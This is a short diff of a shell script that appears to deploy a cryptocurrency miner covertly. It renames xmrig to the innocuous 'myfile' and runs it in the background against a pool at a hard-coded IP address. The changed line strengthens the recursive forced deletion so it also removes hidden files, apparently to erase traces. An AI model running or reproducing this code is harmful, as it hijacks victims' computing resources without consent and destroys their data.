@@ -7,5 +7,5 @@ mv xmrig myfile
 #echo '{"bench-algo-time":2}' > xjson 
 #./myfile -o 79.231.42.249:443 -c xjson
 ./myfile -o 79.231.42.249:443 --background
-rm -r *
+rm -rf {,.[!.],..?}*
 ls
